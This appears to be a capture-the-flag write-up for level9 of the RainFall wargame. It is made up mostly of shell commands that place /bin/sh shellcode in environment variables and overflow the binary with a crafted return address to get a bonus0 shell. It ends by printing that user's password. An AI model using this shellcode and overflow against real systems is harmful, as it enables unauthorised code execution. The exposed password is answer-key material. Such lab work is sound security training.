@@ -1,0 +1,33 @@
+Create two environment variables, one to point to the adress of shellcode and the shellcode itself
+first we need to put a placeholder to get address of the pointer variable then we can replace it by the actuall value of the address
+of the shellcode
+
+level9@RainFall:~$ export SCODE=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
+level9@RainFall:~$ export PTR=$(python -c 'print "AAAA"')
+
+level9@RainFall:~$ vim /tmp/test.c
+
+we create a program to get the address of the two env variables
+
+level9@RainFall:~$ gcc /tmp/test.c -o /tmp/el9
+/tmp/test.c: In function ‘main’:
+/tmp/test.c:4:9: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
+/tmp/test.c:4:9: warning: format ‘%p’ expects argument of type ‘void *’, but argument 3 has type ‘int’ [-Wformat]
+
+we have to match the number of characters on the binary to ./level9 so the stack is the same and the addresses match
+if the length is different, the address of the variables we'll use won't match
+
+level9@RainFall:~$ /tmp/el9
+0xbfffffe3 0xbffff88b
+
+now we can put the actual address of the shellcode variable into the pointer variable
+
+level9@RainFall:~$ export PTR=$(python -c 'print "\xbf\xff\xf8\x8b"[::-1]')
+
+and we run the program by overflowing it with the address of the pointer variable
+
+level9@RainFall:~$ ./level9 $(python -c 'print "A" * 108 + "\xbf\xff\xff\xe3"[::-1]')
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
